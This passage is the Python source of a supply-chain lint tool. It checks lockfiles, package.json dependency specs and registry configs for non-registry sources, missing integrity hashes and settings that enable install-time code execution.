"""supply-chain-check: S1-S7 repo supply-chain lint (lockfiles, registry config, workflows).

Lockfiles are parsed as data (json for npm/deno, JSONC for bun.lock, small line parsers for
pnpm-lock.yaml and yarn.lock, tomllib or a small parser for Cargo.lock). A lockfile format that
cannot be verified (bun.lockb) is a finding. Nothing from the repository is executed.
"""
import json
import os
import re
import shutil
import tempfile

from . import common as C
from .common import Finding

try:  # python 3.11+
    import tomllib as _tomllib
except ImportError:  # pragma: no cover - exercised via GUARD_NO_TOMLLIB in the self-test
    _tomllib = None

NPM_REGISTRY = "https://registry.npmjs.org/"
_RX_NPMJS_URL = re.compile(r"\Ahttps://registry\.npmjs\.org/?\Z")
CRATES_SOURCES = ("registry+https://github.com/rust-lang/crates.io-index", "sparse+https://index.crates.io/")
_HEX64 = re.compile(r"\A[0-9a-f]{64}\Z")


def _base(p):
    return p.rsplit("/", 1)[-1]


def _dir(p):
    return p.rsplit("/", 1)[0] if "/" in p else ""


def _find_line(text, needle, start=0):
    i = text.find(needle, start)
    if i < 0:
        return 1, 1
    return C.line_col(text, i)


# ---------------------------------------------------------------------------
# S1: npm lockfiles + package.json dependency specs
# ---------------------------------------------------------------------------
def _pkg_name_from_key(key):
    i = key.rfind("node_modules/")
    return key[i + len("node_modules/"):] if i >= 0 else key


def check_npm_lock(repo, path, emit):
    raw = repo.read(path)
    text = raw.decode("utf-8", "surrogateescape")
    try:
        doc = json.loads(raw.decode("utf-8-sig"))
    except (ValueError, UnicodeDecodeError) as e:
        emit(Finding("S1", path, 1, 1, "lockfile is not valid JSON (%s)" % C.esc(str(e)[:80]), raw))
        return
    if not isinstance(doc, dict):
        emit(Finding("S1", path, 1, 1, "lockfile root is not an object", raw))
        return
    lockdir = _dir(path)
    ver = doc.get("lockfileVersion")
    if ver not in (1, 2, 3):
        emit(Finding("S1", path, 1, 1, "unsupported lockfileVersion %r" % (ver,), "lockfileVersion=%r" % (ver,)))
    seen = set()

    def bad(key, field, value, msg):
        k = (key, field, value)
        if k in seen:
            return
        seen.add(k)
        line, col = _find_line(text, json.dumps(key)) if key else (1, 1)
        emit(Finding("S1", path, line, col, "%s: %s" % (C.esc(key or "<root>"), msg),
                     "%s\t%s=%s" % (key, field, value), C.esc(("%s=%s" % (field, value))[:120])))

    install_scripts = {}

    def check_entry(key, ent, node_modules_entry):
        if not isinstance(ent, dict):
            bad(key, "entry", "malformed", "lockfile entry is not an object")
            return
        if ent.get("hasInstallScript") is True:
            name = ent.get("name") if isinstance(ent.get("name"), str) else _pkg_name_from_key(key)
            install_scripts.setdefault(name, key)
        if not node_modules_entry:
            # root / workspace folder: never fetched; must be inside the repo, and must not
            # smuggle a remote source
            if C.norm_rel(lockdir, key) is None:
                bad(key, "path", key, "local package folder outside the repository")
            res = ent.get("resolved")
            if res is not None and (not isinstance(res, str) or C.norm_rel(lockdir, res) is None):
                bad(key, "resolved", res, "local package folder with a non-local resolved")
            return
        if ent.get("link") is True:
            res = ent.get("resolved")
            if not isinstance(res, str) or C.norm_rel(lockdir, res) is None:
                bad(key, "resolved", res, "link target outside the repository")
            return
        if ent.get("inBundle") is True or ent.get("bundled") is True:
            return
        res = ent.get("resolved")
        if res is not None and (not isinstance(res, str) or not res.startswith(NPM_REGISTRY)):
            bad(key, "resolved", res, "resolved from a non-registry.npmjs.org source")
        integ = ent.get("integrity")
        if not isinstance(integ, str) or not any(t.startswith("sha512-") for t in integ.split()):
            bad(key, "integrity", integ if isinstance(integ, str) else "<missing>",
                "no sha512 integrity (the tarball is not hash-pinned)")
        v = ent.get("version")
        if isinstance(v, str) and re.match(r"(?i)^(git\+|git:|github:|https?:|file:)", v):
            bad(key, "version", v, "non-registry version spec")

    pk = doc.get("packages")
    if isinstance(pk, dict):
        for key, ent in pk.items():
            if key == "":
                continue
            nm = key.startswith("node_modules/") or "/node_modules/" in key
            check_entry(key, ent, nm)
    elif ver in (2, 3):
        emit(Finding("S1", path, 1, 1, "lockfileVersion %s without a packages map" % ver, "packages=<missing>"))

    def walk_v1(deps, prefix):
        if not isinstance(deps, dict):
            return
        for name, ent in deps.items():
            key = prefix + "node_modules/" + name
            if isinstance(ent, dict) and ent.get("bundled") is True:
                continue
            if isinstance(ent, dict):
                v = ent.get("version")
                if isinstance(v, str) and v.startswith("file:"):
                    if C.norm_rel(lockdir, v[5:]) is None:
                        bad(key, "version", v, "file: dependency outside the repository")
                else:
                    check_entry(key, ent, True)
                walk_v1(ent.get("dependencies"), key + "/")
            else:
                check_entry(key, ent, True)

    walk_v1(doc.get("dependencies"), "")
    return install_scripts


_RX_GH_SHORTHAND = re.compile(r"^[A-Za-z0-9][\w.-]*/[\w.-]+(?:#.*)?$")


def _spec_problem(spec, pkgdir):
    s = spec.strip()
    low = s.lower()
    if low.startswith("npm:"):
        rest = s[4:]
        at = rest.rfind("@")
        if at > 0:
            return _spec_problem(rest[at + 1:], pkgdir)
        return None
    if re.match(r"^(git\+|git:|git@|github:|gitlab:|bitbucket:|gist:|https?:|ssh:)", low):
        return "remote/git dependency spec"
    for pfx in ("file:", "link:", "portal:"):
        if low.startswith(pfx):
            target = s[len(pfx):]
            if target.startswith("//"):
                target = target[2:]
            if C.norm_rel(pkgdir, target) is None:
                return "%s path outside the repository" % pfx[:-1]
            return None
    if s.startswith(("./", "../", "/", "~/")):
        if C.norm_rel(pkgdir, s) is None:
            return "local path outside the repository"
        return None
    if low.startswith(("workspace:", "catalog:", "patch:", "exec:")):
        return None
    if "/" in s and not s.startswith("@") and _RX_GH_SHORTHAND.match(s):
        return "GitHub shorthand (git) dependency spec"
    return None


def check_package_json_specs(repo, path, emit):
    raw = repo.read(path)
    text = raw.decode("utf-8", "surrogateescape")
    try:
        doc = json.loads(raw.decode("utf-8-sig"))
    except (ValueError, UnicodeDecodeError):
        return  # P7 (scan-payload) reports unparseable package.json
    if not isinstance(doc, dict):
        return
    pkgdir = _dir(path)

    def one(section, name, spec):
        if not isinstance(spec, str):
            return
        prob = _spec_problem(spec, pkgdir)
        if prob:
            line, col = _find_line(text, json.dumps(name))
            emit(Finding("S1", path, line, col, "%s %s: %s" % (section, C.esc(name), prob),
                         "%s\t%s=%s" % (section, name, spec), C.esc(spec[:120])))

    def walk_over(section, obj, trail):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str):
                    if not v.startswith("$"):
                        one(section, trail + k, v)
                else:
                    walk_over(section, v, trail + k + ">")

    for sec in ("dependencies", "devDependencies", "optionalDependencies", "peerDependencies"):
        deps = doc.get(sec)
        if isinstance(deps, dict):
            for name, spec in deps.items():
                one(sec, name, spec)
    walk_over("overrides", doc.get("overrides"), "")
    walk_over("resolutions", doc.get("resolutions"), "")
    pn = doc.get("pnpm")
    if isinstance(pn, dict):
        walk_over("pnpm.overrides", pn.get("overrides"), "")


# ---------------------------------------------------------------------------
# S2: pnpm-lock.yaml (line parser; pnpm writes a fixed, simple YAML subset)
# ---------------------------------------------------------------------------
def _unquote(s):
    s = s.strip()
    if len(s) >= 2 and s[0] == s[-1] and s[0] in "'\"":
        return s[1:-1]
    return s


def _parse_flow_map(s):
    """'{a: 1, b: "x, y"}' -> dict. Returns None if it is not a flow mapping."""
    s = s.strip()
    if not (s.startswith("{") and s.endswith("}")):
        return None
    body = s[1:-1]
    items, cur, q, depth = [], [], None, 0
    for ch in body:
        if q:
            cur.append(ch)
            if ch == q:
                q = None
            continue
        if ch in "'\"":
            q = ch
        elif ch in "{[":
            depth += 1
        elif ch in "}]":
            depth -= 1
        elif ch == "," and depth == 0:
            items.append("".join(cur))
            cur = []
            continue
        cur.append(ch)
    if "".join(cur).strip():
        items.append("".join(cur))
    out = {}
    for it in items:
        k, sep, v = it.partition(":")
        if not sep:
            return None
        out[_unquote(k)] = _unquote(v)
    return out


_RX_KEYLINE = re.compile(r"""^((?:'[^']*'|"[^"]*"|[^\s:'"][^:]*?|[^\s'"]\S*?)):(?:\s+(.*))?$""")


def _split_key(st):
    """'key: value' / "'k@1': {..}" -> (key, value or ''). None if the line is not a mapping entry."""
    m = _RX_KEYLINE.match(st)
    if not m:
        return None
    return _unquote(m.group(1)), (m.group(2) or "").strip()


def check_pnpm_lock(repo, path, emit):
    text = repo.read(path).decode("utf-8", "surrogateescape")
    lockdir = _dir(path)
    lines = text.split("\n")
    section = None
    sec_indent = None
    pkgs = []
    cur = None
    block_res = None
    block_indent = 0
    importer = None
    imp_indent = None
    for i, raw in enumerate(lines):
        line = raw.rstrip("\r")
        st = line.strip()
        if st == "---" or st == "...":
            section, cur, block_res, importer = None, None, None, None
            continue
        if not st or st.startswith("#"):
            continue
        if "\t" in line[:len(line) - len(line.lstrip())]:
            emit(Finding("S2", path, i + 1, 1, "tab indentation (cannot verify structure)", line))
            continue
        ind = len(line) - len(line.lstrip(" "))
        if block_res is not None:
            if ind > block_indent:
                kv = _split_key(st)
                if kv:
                    block_res[kv[0]] = _unquote(kv[1])
                    cur["lines"].add(i + 1)
                else:
                    block_res["<unparsed>"] = st
                continue
            block_res = None
        if ind == 0:
            section = st.split(":", 1)[0].strip()
            sec_indent, cur, importer, imp_indent = None, None, None, None
            continue
        if section == "packages":
            if sec_indent is None:
                sec_indent = ind
            kv = _split_key(st)
            if ind == sec_indent:
                if kv is None:
                    emit(Finding("S2", path, i + 1, 1, "unparseable packages entry", line))
                    cur = None
                    continue
                cur = {"key": kv[0], "line": i + 1, "res": None, "res_line": i + 1, "lines": set([i + 1])}
                pkgs.append(cur)
                if kv[1]:
                    fm = _parse_flow_map(kv[1])
                    if fm is None:
                        cur["res"] = {"<unparsed>": kv[1]}
                    elif fm.get("resolution") is not None:
                        rm = _parse_flow_map(fm["resolution"])
                        cur["res"] = rm if rm is not None else {"<unparsed>": fm["resolution"]}
            elif cur is not None and ind > sec_indent and kv and kv[0] == "resolution":
                cur["res_line"] = i + 1
                cur["lines"].add(i + 1)
                if kv[1]:
                    m = _parse_flow_map(kv[1])
                    cur["res"] = m if m is not None else {"<unparsed>": kv[1]}
                else:
                    cur["res"] = {}
                    block_res = cur["res"]
                    block_indent = ind
        elif section == "importers":
            kv = _split_key(st)
            if imp_indent is None:
                imp_indent = ind
            if ind == imp_indent and kv and not kv[1]:
                importer = kv[0]
            elif importer is not None and kv:
                v = _unquote(kv[1])
                if v.startswith("link:") or v.startswith("file:"):
                    base = C.norm_rel(lockdir, importer if importer != "." else "")
                    tgt = v.split(":", 1)[1]
                    if base is None or C.norm_rel(base, tgt) is None:
                        emit(Finding("S2", path, i + 1, ind + 1, "importer %s links outside the repository: %s"
                                     % (C.esc(importer), C.esc(v[:100])), "%s\t%s" % (importer, v)))

    # structure-independent sweep: every tarball/git/directory anywhere in the file
    parsed_res = sum(1 for p in pkgs if p["res"] is not None)
    all_res = len(re.findall(r"(?m)^[ ]*resolution\s*:", text)) + len(re.findall(r"[{,]\s*resolution\s*:", text))
    if all_res != parsed_res:
        emit(Finding("S2", path, 1, 1, "%d resolution entries in the file but %d parsed (cannot verify)"
                     % (all_res, parsed_res), "resolution-count=%d/%d" % (all_res, parsed_res)))
    for m in re.finditer(r"""\btarball\s*:\s*['"]?([^\s,'"}]+)""", text):
        if not m.group(1).startswith(NPM_REGISTRY):
            line, col = C.line_col(text, m.start())
            if not any(line in p["lines"] for p in pkgs):
                emit(Finding("S2", path, line, col, "tarball from a non-registry.npmjs.org host",
                             "tarball=%s" % m.group(1), C.esc(m.group(1)[:120])))

    for p in pkgs:
        key, res, ln = p["key"], p["res"], p["res_line"]

        def bad(msg, field, value):
            emit(Finding("S2", path, ln, 1, "%s: %s" % (C.esc(key[:100]), msg), "%s\t%s=%s" % (key, field, value),
                         C.esc(("%s=%s" % (field, value))[:120])))

        if res is None:
            bad("package entry has no resolution (cannot verify)", "resolution", "<missing>")
            continue
        if "<unparsed>" in res:
            bad("unparseable resolution", "resolution", res["<unparsed>"])
            continue
        rtype = res.get("type", "")
        if rtype == "git" or "commit" in res or "repo" in res:
            bad("git resolution", "repo", res.get("repo", "") + "#" + res.get("commit", ""))
            continue
        if "directory" in res or rtype == "directory":
            d = res.get("directory", "")
            if C.norm_rel(lockdir, d) is None:
                bad("directory resolution outside the repository", "directory", d)
            continue
        if "tarball" in res:
            t = res["tarball"]
            if not t.startswith(NPM_REGISTRY):
                bad("tarball from a non-registry.npmjs.org host", "tarball", t)
        if not res.get("integrity"):
            bad("resolution without integrity", "integrity", "<missing>")
    return True


# ---------------------------------------------------------------------------
# S3: Cargo.lock
# ---------------------------------------------------------------------------
def _parse_cargo_lock_fallback(text):
    pkgs, meta, cur, section, in_array = [], {}, None, None, False
    for raw in text.split("\n"):
        line = raw.strip()
        if in_array:
            if line.endswith("]"):
                in_array = False
            continue
        if not line or line.startswith("#"):
            continue
        if line == "[[package]]":
            cur = {}
            pkgs.append(cur)
            section = "package"
            continue
        if line.startswith("["):
            section = line.strip("[]").strip()
            cur = None
            continue
        k, sep, v = line.partition("=")
        if not sep:
            continue
        k, v = k.strip(), v.strip()
        if v.startswith("[") and not v.endswith("]"):
            in_array = True
            continue
        if section == "package" and cur is not None:
            if v.startswith('"') and v.endswith('"'):
                cur[k] = v[1:-1]
        elif section == "metadata":
            meta[_unquote(k)] = _unquote(v)
    return {"package": pkgs, "metadata": meta}


def check_cargo_lock(repo, path, emit):
    raw = repo.read(path)
    text = raw.decode("utf-8", "surrogateescape")
    doc = None
    if _tomllib is not None and not os.environ.get("GUARD_NO_TOMLLIB"):
        try:
            doc = _tomllib.loads(raw.decode("utf-8"))
        except (ValueError, UnicodeDecodeError) as e:
            emit(Finding("S3", path, 1, 1, "Cargo.lock is not valid TOML (%s)" % C.esc(str(e)[:80]), raw))
            return
    else:
        doc = _parse_cargo_lock_fallback(text)
    meta = doc.get("metadata") or {}
    for pkg in doc.get("package") or []:
        if not isinstance(pkg, dict):
            continue
        name, ver, src = pkg.get("name", "?"), pkg.get("version", "?"), pkg.get("source")
        ident = "%s@%s" % (name, ver)
        line, col = _find_line(text, 'name = "%s"\nversion = "%s"' % (name, ver))
        if src is None:
            continue  # path / workspace crate
        if src not in CRATES_SOURCES:
            emit(Finding("S3", path, line, col, "%s from non-crates.io source %s" % (C.esc(ident), C.esc(src[:100])),
                         "%s\tsource=%s" % (ident, src)))
            continue
        ck = pkg.get("checksum")
        if ck is None:
            ck = meta.get("checksum %s %s (%s)" % (name, ver, src))
        if not isinstance(ck, str) or not _HEX64.match(ck):
            emit(Finding("S3", path, line, col, "%s has no sha256 checksum" % C.esc(ident),
                         "%s\tchecksum=<missing>" % ident))


# ---------------------------------------------------------------------------
# S1 (cont.): yarn.lock (classic v1 and berry), bun.lock / bun.lockb, deno.lock
# ---------------------------------------------------------------------------
_RX_YARN_REGISTRY_URL = re.compile(r"\Ahttps://registry\.(?:yarnpkg\.com|npmjs\.org)/[^\s#?]+\.tgz(?:#[0-9a-fA-F]+)?\Z")
_RX_REMOTE_SPEC = re.compile(r"(?i)\A(?:git\+|git:|git@|github:|gitlab:|bitbucket:|gist:|https?:|ssh:)")
_RX_BERRY_CHECKSUM = re.compile(r"\A(?:\d+[a-z]\d+/)?[0-9a-f]{64,128}\Z")
DENO_REMOTE_HOSTS = ("deno.land", "jsr.io")


def _spec_range(spec):
    """'name@range' / '@scope/name@range' -> range ('' when there is none)."""
    at = spec.find("@", 1)
    return spec[at + 1:] if at > 0 else ""


def _lock_bad(emit, check, path, line, ident, field, value, msg):
    emit(Finding(check, path, line, 1, "%s: %s" % (C.esc(ident[:100]), msg), "%s\t%s=%s" % (ident, field, value),
                 C.esc(("%s=%s" % (field, value))[:120])))


def _local_spec_problem(lockdir, proto, target):
    target = target.split("::", 1)[0].split("#", 1)[0]
    if target.startswith("//"):
        target = target[2:]
    if C.norm_rel(lockdir, target) is None:
        return "%s path outside the repository" % proto
    return None


def check_yarn_lock(repo, path, emit):
    text = repo.read(path).decode("utf-8", "surrogateescape")
    lockdir = _dir(path)
    berry = re.search(r"(?m)^__metadata:", text) is not None
    entries, cur = [], None
    for i, raw in enumerate(text.split("\n")):
        line = raw.rstrip("\r")
        st = line.strip()
        if not st or st.startswith("#"):
            continue
        if "\t" in line[:len(line) - len(line.lstrip())]:
            emit(Finding("S1", path, i + 1, 1, "yarn.lock with tab indentation (cannot verify structure)", line))
            cur = None
            continue
        ind = len(line) - len(line.lstrip(" "))
        if ind == 0:
            if not st.endswith(":"):
                emit(Finding("S1", path, i + 1, 1, "unparseable yarn.lock entry header (cannot verify)", line))
                cur = None
                continue
            cur = {"key": st[:-1], "line": i + 1, "fields": {}}
            entries.append(cur)
            continue
        if cur is None or ind != 2:
            continue
        if berry:
            kv = _split_key(st)
            if kv and kv[1]:
                cur["fields"][kv[0]] = (_unquote(kv[1]), i + 1)
        elif not st.endswith(":"):
            k, _sep, v = st.partition(" ")
            cur["fields"][_unquote(k)] = (_unquote(v.strip()), i + 1)
    for e in entries:
        key, f = e["key"], e["fields"]
        if key == "__metadata":
            continue
        if berry:
            _check_berry_entry(path, lockdir, e, emit)
            continue
        specs = [_unquote(s.strip()) for s in key.split(",")]
        local = None
        for s in specs:
            rng = _spec_range(s)
            for pfx in ("file:", "link:", "portal:", "workspace:"):
                if rng.startswith(pfx):
                    local = (pfx[:-1], rng[len(pfx):])
        res = f.get("resolved")
        if res is None:
            if local is None:
                _lock_bad(emit, "S1", path, e["line"], key, "resolved", "<missing>", "entry has no resolved URL (cannot verify)")
            elif local[0] != "workspace":
                prob = _local_spec_problem(lockdir, local[0], local[1])
                if prob:
                    _lock_bad(emit, "S1", path, e["line"], key, local[0], local[1], prob)
            continue
        url, ln = res
        if url.startswith(("file:", "link:")):
            prob = _local_spec_problem(lockdir, url.split(":", 1)[0], url.split(":", 1)[1])
            if prob:
                _lock_bad(emit, "S1", path, ln, key, "resolved", url, prob)
            continue
        if not _RX_YARN_REGISTRY_URL.match(url):
            _lock_bad(emit, "S1", path, ln, key, "resolved", url,
                      "resolved from a source other than registry.yarnpkg.com / registry.npmjs.org")
            continue
        integ = f.get("integrity")
        if integ is None or not any(t.startswith("sha512-") for t in integ[0].split()):
            _lock_bad(emit, "S1", path, integ[1] if integ else e["line"], key, "integrity",
                      integ[0] if integ else "<missing>", "no sha512 integrity (the tarball is not hash-pinned)")


def _check_berry_entry(path, lockdir, e, emit):
    key, f = e["key"], e["fields"]
    res = f.get("resolution")
    if res is None:
        _lock_bad(emit, "S1", path, e["line"], key, "resolution", "<missing>", "entry has no resolution (cannot verify)")
        return
    spec, ln = res
    proto = _spec_range(spec)
    ck = f.get("checksum")

    def need_checksum():
        if ck is None or not _RX_BERRY_CHECKSUM.match(ck[0]):
            _lock_bad(emit, "S1", path, ln, key, "checksum", ck[0] if ck else "<missing>",
                      "no checksum (the package is not hash-pinned)")

    if proto.startswith("npm:"):
        need_checksum()
    elif proto.startswith("workspace:"):
        return
    elif proto.startswith(("file:", "link:", "portal:")):
        p, _s, target = proto.partition(":")
        prob = _local_spec_problem(lockdir, p, target)
        if prob:
            _lock_bad(emit, "S1", path, ln, key, "resolution", spec, prob)
    elif proto.startswith("patch:"):
        try:
            from urllib.parse import unquote as _uq
        except ImportError:  # pragma: no cover
            _uq = lambda s: s  # noqa: E731
        inner, _s, patchref = proto[6:].partition("#")
        inner = _uq(inner)
        if not _spec_range(inner).startswith(("npm:", "workspace:")):
            _lock_bad(emit, "S1", path, ln, key, "resolution", spec, "patch of a non-registry package")
            return
        pf = _uq(patchref.split("::", 1)[0])
        if pf and not pf.startswith("optional!builtin<") and not pf.startswith("builtin<"):
            pf = pf[2:] if pf.startswith("~/") else pf
            if C.norm_rel(lockdir, pf) is None:
                _lock_bad(emit, "S1", path, ln, key, "resolution", spec, "patch file outside the repository")
                return
        need_checksum()
    else:
        _lock_bad(emit, "S1", path, ln, key, "resolution", spec, "non-registry resolution (git, http or exec)")


def _jsonc_to_json(s):
    """bun.lock is JSON with trailing commas (and possibly comments): strip both outside strings."""
    out, i, n, in_str = [], 0, len(s), False
    while i < n:
        ch = s[i]
        if in_str:
            out.append(ch)
            if ch == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if ch == '"':
                in_str = False
            i += 1
            continue
        if ch == '"':
            in_str = True
        elif s.startswith("//", i):
            j = s.find("\n", i)
            i = n if j < 0 else j
            continue
        elif s.startswith("/*", i):
            j = s.find("*/", i + 2)
            i = n if j < 0 else j + 2
            continue
        elif ch == ",":
            j = i + 1
            while j < n and s[j] in " \t\r\n":
                j += 1
            if j < n and s[j] in "]}":
                i += 1
                continue
        out.append(ch)
        i += 1
    return "".join(out)


def check_bun_lock(repo, path, emit):
    raw = repo.read(path)
    text = raw.decode("utf-8", "surrogateescape")
    lockdir = _dir(path)
    try:
        doc = json.loads(_jsonc_to_json(raw.decode("utf-8-sig")))
    except (ValueError, UnicodeDecodeError) as e:
        emit(Finding("S1", path, 1, 1, "bun.lock is not parseable (%s); cannot verify" % C.esc(str(e)[:80]), raw))
        return
    pk = doc.get("packages") if isinstance(doc, dict) else None
    if not isinstance(pk, dict):
        emit(Finding("S1", path, 1, 1, "bun.lock without a packages map (cannot verify)", "packages=<missing>"))
        return
    for key, ent in pk.items():
        line, _c = _find_line(text, json.dumps(key) + ":")
        if not isinstance(ent, list) or not ent or not isinstance(ent[0], str):
            _lock_bad(emit, "S1", path, line, key, "entry", "malformed", "malformed bun.lock entry (cannot verify)")
            continue
        ident = ent[0]
        spec = _spec_range(ident)
        if spec.startswith(("workspace:", "root:")) or spec == "":
            continue
        if spec.startswith(("file:", "link:")):
            p, _s, target = spec.partition(":")
            prob = _local_spec_problem(lockdir, p, target)
            if prob:
                _lock_bad(emit, "S1", path, line, key, "resolution", ident, prob)
            continue
        if spec.startswith("npm:"):
            spec = _spec_range(spec[4:]) or spec[4:]
        if _RX_REMOTE_SPEC.match(spec) or "/" in spec or ":" in spec:
            _lock_bad(emit, "S1", path, line, key, "resolution", ident, "resolved from a non-registry source")
            continue
        reg = ent[1] if len(ent) > 1 else None
        if not isinstance(reg, str) or (reg and not reg.startswith(NPM_REGISTRY)):
            _lock_bad(emit, "S1", path, line, key, "registry", reg if isinstance(reg, str) else "<missing>",
                      "resolved from a non-registry.npmjs.org registry")
            continue
        integ = ent[3] if len(ent) > 3 else None
        if not isinstance(integ, str) or not integ.startswith("sha512-"):
            _lock_bad(emit, "S1", path, line, key, "integrity", integ if isinstance(integ, str) else "<missing>",
                      "no sha512 integrity (the tarball is not hash-pinned)")


def _url_host(url):
    m = re.match(r"(?i)\Ahttps://([^/:@\s]+)(?::443)?(?:/|\Z)", url)
    return m.group(1).lower() if m else None


def check_deno_lock(repo, path, emit):
    raw = repo.read(path)
    text = raw.decode("utf-8", "surrogateescape")
    try:
        doc = json.loads(raw.decode("utf-8-sig"))
    except (ValueError, UnicodeDecodeError) as e:
        emit(Finding("S1", path, 1, 1, "deno.lock is not valid JSON (%s); cannot verify" % C.esc(str(e)[:80]), raw))
        return
    if not isinstance(doc, dict):
        emit(Finding("S1", path, 1, 1, "deno.lock root is not an object", raw))
        return
    ver = str(doc.get("version", ""))
    if ver == "2":
        npm = (doc.get("npm") or {}).get("packages") or {}
        jsr = {}
    elif ver == "3":
        pk = doc.get("packages") or {}
        npm, jsr = pk.get("npm") or {}, pk.get("jsr") or {}
    elif ver in ("4", "5"):
        npm, jsr = doc.get("npm") or {}, doc.get("jsr") or {}
    else:
        emit(Finding("S1", path, 1, 1, "unsupported deno.lock version %r (cannot verify)" % C.esc(ver),
                     "version=%s" % ver))
        return
    if not isinstance(npm, dict) or not isinstance(jsr, dict):
        emit(Finding("S1", path, 1, 1, "malformed deno.lock package maps (cannot verify)", "packages=malformed"))
        return
    for key, ent in npm.items():
        line, _c = _find_line(text, json.dumps(key) + ":")
        integ = ent.get("integrity") if isinstance(ent, dict) else None
        if not isinstance(integ, str) or not integ.startswith("sha512-"):
            _lock_bad(emit, "S1", path, line, "npm:" + key, "integrity", integ if isinstance(integ, str) else "<missing>",
                      "no sha512 integrity (the tarball is not hash-pinned)")
        tb = ent.get("tarball") if isinstance(ent, dict) else None
        if tb is not None and (not isinstance(tb, str) or not tb.startswith(NPM_REGISTRY)):
            _lock_bad(emit, "S1", path, line, "npm:" + key, "tarball", tb, "tarball from a non-registry.npmjs.org host")
    for key, ent in jsr.items():
        line, _c = _find_line(text, json.dumps(key) + ":")
        integ = ent.get("integrity") if isinstance(ent, dict) else None
        if not isinstance(integ, str) or not _HEX64.match(integ):
            _lock_bad(emit, "S1", path, line, "jsr:" + key, "integrity", integ if isinstance(integ, str) else "<missing>",
                      "no sha256 integrity")
    remote = doc.get("remote") or {}
    redirects = doc.get("redirects") or {}
    for url in (list(remote) if isinstance(remote, dict) else []) + \
            ([v for v in redirects.values() if isinstance(v, str)] if isinstance(redirects, dict) else []):
        if _url_host(url) not in DENO_REMOTE_HOSTS:
            line, _c = _find_line(text, json.dumps(url))
            _lock_bad(emit, "S1", path, line, "remote", "url", url,
                      "remote module from a host other than %s" % " / ".join(DENO_REMOTE_HOSTS))


# ---------------------------------------------------------------------------
# S4: install scripts
# ---------------------------------------------------------------------------
_RX_PNPM_ALLOW = re.compile(r"^(allowBuilds|onlyBuiltDependencies|onlyBuiltDependenciesFile)\s*:", re.M)
_RX_PNPM_ALLOW_ALL = re.compile(r"^\s*dangerouslyAllowAllBuilds\s*:\s*true\b.*$", re.M)


def check_pnpm_builds(repo, lockpath, emit):
    d = _dir(lockpath)
    pre = (d + "/") if d else ""
    ok = False
    ws = pre + "pnpm-workspace.yaml"
    if ws in repo.modes:
        t = repo.read(ws).decode("utf-8", "surrogateescape")
        if _RX_PNPM_ALLOW.search(t):
            ok = True
        for m in _RX_PNPM_ALLOW_ALL.finditer(t):
            line, col = C.line_col(t, m.start())
            emit(Finding("S4", ws, line, col, "dangerouslyAllowAllBuilds lets every dependency run install scripts",
                         m.group(0).rstrip("\r")))
    pj = pre + "package.json"
    if pj in repo.modes:
        try:
            doc = json.loads(repo.read(pj).decode("utf-8-sig"))
        except (ValueError, UnicodeDecodeError):
            doc = None
        if isinstance(doc, dict) and isinstance(doc.get("pnpm"), dict):
            pn = doc["pnpm"]
            if any(k in pn for k in ("onlyBuiltDependencies", "allowBuilds", "onlyBuiltDependenciesFile")):
                ok = True
    if not ok:
        emit(Finding("S4", lockpath, 1, 1, "pnpm project without an explicit build allow list "
                     "(pnpm-workspace.yaml allowBuilds/onlyBuiltDependencies or package.json "
                     "pnpm.onlyBuiltDependencies)", "pnpm-build-allowlist-missing"))


_YARN_SCRIPTS_OFF = ((".yarnrc.yml", re.compile(r"(?m)^enableScripts\s*:\s*false\b")),
                     (".yarnrc", re.compile(r"(?m)^\s*\"?ignore-scripts\"?\s+\"?true\"?\s*$")),
                     (".npmrc", re.compile(r"(?m)^\s*ignore-scripts\s*=\s*true\s*$")))


def check_yarn_scripts(repo, lockpath, emit):
    """yarn (classic and berry) runs every dependency's install scripts unless told not to."""
    d = _dir(lockpath)
    for pre in sorted(set([(d + "/") if d else "", ""])):
        for name, rx in _YARN_SCRIPTS_OFF:
            p = pre + name
            if p in repo.modes and rx.search(repo.read(p).decode("utf-8", "surrogateescape")):
                return
    emit(Finding("S4", lockpath, 1, 1, "yarn project runs every dependency's install scripts (set enableScripts: "
                 "false in .yarnrc.yml or ignore-scripts true in .yarnrc)", "yarn-scripts-enabled"))


# ---------------------------------------------------------------------------
# S5: registry / install config files
# ---------------------------------------------------------------------------
def _registry_ok(url):
    return bool(_RX_NPMJS_URL.match(_unquote(url.strip())))


_RX_PRELOAD_OPTS = re.compile(r"(?:^|\s)(?:--require|-r|--import|--loader|--experimental-loader)(?:[\s=]|$)")


def check_registry_config(repo, path, emit):
    base = _base(path)
    raw = repo.read(path)
    text = raw.decode("utf-8", "surrogateescape")
    if base == ".pnpmfile.cjs":
        emit(Finding("S5", path, 1, 1, ".pnpmfile.cjs hooks run code during every pnpm install", raw))
        return

    def flag(n, line, msg):
        emit(Finding("S5", path, n, 1, msg, line, C.esc(line.strip()[:120])))

    for n, raw_line in enumerate(text.split("\n"), 1):
        line = raw_line[:-1] if raw_line.endswith("\r") else raw_line
        st = line.strip()
        if not st or st.startswith("#") or st.startswith(";"):
            continue
        if base == ".npmrc":
            k, sep, v = st.partition("=")
            if not sep:
                continue
            k = k.strip().lower()
            if k == "registry" or re.match(r"^@[^:]+:registry$", k):
                if not _registry_ok(v):
                    flag(n, line, "registry override to %s" % C.esc(_unquote(v.strip())[:80]))
            elif k == "ignore-scripts" and _unquote(v.strip()).lower() == "false":
                flag(n, line, "ignore-scripts=false re-enables install scripts")
            elif k == "node-options" and _RX_PRELOAD_OPTS.search(_unquote(v.strip())):
                flag(n, line, "node-options preloads code into every npm-run node process")
            elif k in ("onload-script", "script-shell", "git", "init-module"):
                flag(n, line, "%s makes npm run a configurable program" % k)
        elif base == ".yarnrc":
            m = re.match(r'^"?(@[^":\s]+:)?registry"?\s+(.+)$', st)
            if m and not _registry_ok(m.group(2)):
                flag(n, line, "registry override to %s" % C.esc(_unquote(m.group(2))[:80]))
            m = re.match(r'^"?ignore-scripts"?\s+"?false"?\s*$', st)
            if m:
                flag(n, line, "ignore-scripts false re-enables install scripts")
            if re.match(r'^"?yarn-path"?\s', st):
                flag(n, line, "yarn-path runs a committed file as yarn")
        elif base == ".yarnrc.yml":
            m = re.match(r"^npmRegistryServer\s*:\s*(.+)$", st)
            if m and not _registry_ok(m.group(1)):
                flag(n, line, "npmRegistryServer override to %s" % C.esc(_unquote(m.group(1))[:80]))
            if re.match(r"^yarnPath\s*:", line):
                flag(n, line, "yarnPath runs a committed file as yarn")
            if re.match(r"^plugins\s*:", line):
                flag(n, line, "yarn plugins run code on every yarn command")
        elif base == "bunfig.toml":
